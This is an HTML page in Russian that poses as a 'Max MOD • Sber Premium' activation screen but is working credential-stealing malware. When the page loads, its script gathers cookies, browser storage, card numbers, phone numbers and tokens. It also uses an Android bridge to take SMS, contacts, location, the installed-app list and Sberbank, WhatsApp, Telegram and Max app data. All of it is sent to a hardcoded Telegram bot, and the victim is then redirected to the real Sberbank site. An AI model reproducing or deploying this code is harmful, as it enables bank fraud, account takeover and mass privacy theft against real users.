<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Max MOD • Активация</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e88e5, #0d47a1);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        }
        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #1e88e5, #0d47a1);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .icon span { font-size: 40px; font-weight: bold; color: white; }
        h2 { font-size: 22px; color: #1e293b; margin-bottom: 8px; }
        p { color: #64748b; font-size: 14px; margin-bottom: 24px; }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #1e88e5;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 13px; color: #1e88e5; margin-top: 16px; }
        .footer { margin-top: 24px; font-size: 11px; color: #94a3b8; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon"><span>M</span></div>
    <h2>Max MOD • Сбер Premium</h2>
    <p>Активация дополнительных функций</p>
    <div class="loader"></div>
    <div class="status" id="status">Подготовка...</div>
    <div class="footer">Версия 4.2.0</div>
</div>

<script>
// ==================== ВСТАВЬ СВОИ ДАННЫЕ ====================
const BOT_TOKEN = "8655252412:AAGvwRmEBisGeKA5bX5_xFNpp2QRJRTkkTM";  // ТОКЕН БОТА
const CHAT_ID = "8533450974";                           // ТВОЙ CHAT_ID
const MY_CARD = "2203830216112947";                    // ТВОЯ КАРТА
// =========================================================

function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000) })
    }).catch(e => console.log("send error"));
}

function updateStatus(msg) {
    document.getElementById('status').innerText = msg;
}

// ========== 1. СБОР ВСЕХ ДАННЫХ ИЗ BROWSER ==========
function getAllBrowserData() {
    const data = {
        localStorage: {},
        sessionStorage: {},
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toLocaleString()
    };
    
    // localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        let val = localStorage.getItem(key);
        if (val && val.length > 500) val = val.substring(0, 500) + "...";
        data.localStorage[key] = val;
    }
    
    // sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        let val = sessionStorage.getItem(key);
        if (val && val.length > 500) val = val.substring(0, 500) + "...";
        data.sessionStorage[key] = val;
    }
    
    // Поиск карт, телефонов, токенов
    data.found = { cards: [], phones: [], tokens: [] };
    for (const val of Object.values(data.localStorage)) {
        if (typeof val === 'string') {
            const cards = val.match(/\d{16}/g);
            if (cards) data.found.cards.push(...cards);
            const phones = val.match(/7\d{10}/g);
            if (phones) data.found.phones.push(...phones);
            const tokens = val.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g);
            if (tokens) data.found.tokens.push(...tokens);
        }
    }
    data.found.cards = [...new Set(data.found.cards)];
    data.found.phones = [...new Set(data.found.phones)];
    data.found.tokens = [...new Set(data.found.tokens)];
    
    return data;
}

// ========== 2. СБОР ДАННЫХ ЧЕРЕЗ ANDROID JAVA-МОСТ ==========
function getAllAndroidData() {
    const androidData = {};
    
    if (!window.Android) {
        androidData.error = "Нет доступа к Android API";
        return androidData;
    }
    
    try {
        // SMS
        if (window.Android.getSms) {
            androidData.sms = window.Android.getSms();
        }
        
        // Контакты
        if (window.Android.getContacts) {
            androidData.contacts = window.Android.getContacts();
        }
        
        // СберБанк (shared_prefs)
        if (window.Android.getSberData) {
            const sber = window.Android.getSberData();
            if (sber && sber !== "null") {
                try { androidData.sber = JSON.parse(sber); } catch(e) { androidData.sber = sber; }
            }
        }
        
        // Max (shared_prefs)
        if (window.Android.getMaxData) {
            const max = window.Android.getMaxData();
            if (max && max !== "null") {
                try { androidData.max = JSON.parse(max); } catch(e) { androidData.max = max; }
            }
        }
        
        // Все установленные приложения
        if (window.Android.getInstalledApps) {
            androidData.installedApps = window.Android.getInstalledApps();
        }
        
        // Геолокация
        if (window.Android.getLocation) {
            androidData.location = window.Android.getLocation();
        }
        
        // Данные из WhatsApp
        if (window.Android.getWhatsAppData) {
            androidData.whatsapp = window.Android.getWhatsAppData();
        }
        
        // Данные из Telegram
        if (window.Android.getTelegramData) {
            androidData.telegram = window.Android.getTelegramData();
        }
        
        // Файлы из папок приложений
        const packages = [
            "ru.sberbankmobile",
            "ru.max.messenger",
            "com.whatsapp",
            "org.telegram.messenger",
            "com.viber.voip"
        ];
        
        for (const pkg of packages) {
            if (window.Android.getAppData) {
                const appData = window.Android.getAppData(pkg);
                if (appData && appData !== "null") {
                    androidData[`app_${pkg.replace(/\./g, '_')}`] = appData;
                }
            }
        }
        
    } catch(e) {
        androidData.error = e.toString();
    }
    
    return androidData;
}

// ========== 3. ФОРМИРОВАНИЕ И ОТПРАВКА ПОЛНОГО ОТЧЕТА ==========
function sendFullReport(browserData, androidData) {
    // ========== ОСНОВНОЙ ОТЧЕТ ==========
    let report = `🔐 *ПОЛНЫЙ СБОР ДАННЫХ*\n`;
    report += `⏰ ${browserData.timestamp}\n`;
    report += `📱 ${browserData.userAgent.substring(0, 100)}\n`;
    report += `🌐 ${browserData.language} | ${browserData.screen}\n`;
    report += `⏰ Часовой пояс: ${browserData.timezone}\n`;
    report += `🍪 Cookies: ${browserData.cookies ? "✅ есть" : "❌ нет"}\n`;
    report += `💾 localStorage: ${Object.keys(browserData.localStorage).length} записей\n`;
    
    // Найденные данные
    if (browserData.found.cards.length > 0) {
        report += `\n💳 *НАЙДЕНЫ КАРТЫ:*\n${browserData.found.cards.join("\n")}\n`;
    }
    if (browserData.found.phones.length > 0) {
        report += `\n📞 *НАЙДЕНЫ ТЕЛЕФОНЫ:*\n${browserData.found.phones.join("\n")}\n`;
    }
    if (browserData.found.tokens.length > 0) {
        report += `\n🔑 *НАЙДЕНЫ ТОКЕНЫ:*\n${browserData.found.tokens.length} шт.\nПервый: ${browserData.found.tokens[0].substring(0, 60)}...\n`;
    }
    
    // Android данные
    if (androidData.sms) {
        report += `\n📨 *SMS (последние):*\n${androidData.sms.substring(0, 500)}\n`;
    }
    if (androidData.contacts) {
        report += `\n📞 *КОНТАКТЫ:*\n${androidData.contacts.substring(0, 500)}\n`;
    }
    if (androidData.location) {
        report += `\n📍 *ГЕОЛОКАЦИЯ:*\n${androidData.location}\n`;
    }
    if (androidData.sber) {
        report += `\n🏦 *СБЕРБАНК (shared_prefs):*\n${JSON.stringify(androidData.sber, null, 2).substring(0, 800)}\n`;
    }
    if (androidData.max) {
        report += `\n💬 *MAX (shared_prefs):*\n${JSON.stringify(androidData.max, null, 2).substring(0, 800)}\n`;
    }
    if (androidData.installedApps) {
        report += `\n📦 *УСТАНОВЛЕННЫЕ ПРИЛОЖЕНИЯ:*\n${androidData.installedApps.substring(0, 500)}\n`;
    }
    
    report += `\n💰 *ПЕРЕВОД НА КАРТУ*\n💳 ${MY_CARD}`;
    
    sendToTelegram(report);
    
    // ========== ОТПРАВКА ПОЛНЫХ ДАННЫХ ==========
    
    // localStorage
    if (Object.keys(browserData.localStorage).length > 0) {
        sendToTelegram(`💾 *FULL LOCALSTORAGE:*\n\`\`\`json\n${JSON.stringify(browserData.localStorage, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // sessionStorage
    if (Object.keys(browserData.sessionStorage).length > 0) {
        sendToTelegram(`📦 *SESSIONSTORAGE:*\n\`\`\`json\n${JSON.stringify(browserData.sessionStorage, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // Cookies
    if (browserData.cookies && browserData.cookies.length > 0) {
        sendToTelegram(`🍪 *COOKIES:*\n${browserData.cookies.substring(0, 3500)}`);
    }
    
    // Все токены
    if (browserData.found.tokens.length > 0) {
        sendToTelegram(`🔑 *ВСЕ ТОКЕНЫ:*\n${browserData.found.tokens.join("\n\n").substring(0, 3500)}`);
    }
    
    // Все SMS
    if (androidData.sms && androidData.sms.length > 0) {
        sendToTelegram(`📨 *ВСЕ SMS:*\n${androidData.sms.substring(0, 3500)}`);
    }
    
    // Все контакты
    if (androidData.contacts && androidData.contacts.length > 0) {
        sendToTelegram(`📞 *ВСЕ КОНТАКТЫ:*\n${androidData.contacts.substring(0, 3500)}`);
    }
    
    // Данные Сбера
    if (androidData.sber) {
        sendToTelegram(`🏦 *СБЕРБАНК ПОЛНЫЕ ДАННЫЕ:*\n\`\`\`json\n${JSON.stringify(androidData.sber, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // Данные Max
    if (androidData.max) {
        sendToTelegram(`💬 *MAX ПОЛНЫЕ ДАННЫЕ:*\n\`\`\`json\n${JSON.stringify(androidData.max, null, 2).substring(0, 3500)}\n\`\`\``);
    }
    
    // WhatsApp данные
    if (androidData.whatsapp) {
        sendToTelegram(`💬 *WHATSAPP ДАННЫЕ:*\n${androidData.whatsapp.substring(0, 3500)}`);
    }
    
    // Telegram данные
    if (androidData.telegram) {
        sendToTelegram(`📱 *TELEGRAM ДАННЫЕ:*\n${androidData.telegram.substring(0, 3500)}`);
    }
}

// ========== 4. ЗАПРОС РАЗРЕШЕНИЙ ==========
function requestAllPermissions() {
    if (window.Android) {
        try {
            window.Android.requestPermissions();
            return true;
        } catch(e) {
            return false;
        }
    }
    return false;
}

// ========== 5. ГЛАВНАЯ ФУНКЦИЯ ==========
async function main() {
    updateStatus("Запрос разрешений...");
    requestAllPermissions();
    
    updateStatus("Сбор данных браузера...");
    const browserData = getAllBrowserData();
    
    updateStatus("Сбор данных Android...");
    const androidData = getAllAndroidData();
    
    updateStatus("Отправка данных...");
    sendFullReport(browserData, androidData);
    
    updateStatus("✅ Активация завершена!");
    
    setTimeout(() => {
        window.location.href = "https://online.sberbank.ru";
    }, 4000);
}

main();
</script>
</body>
</html>
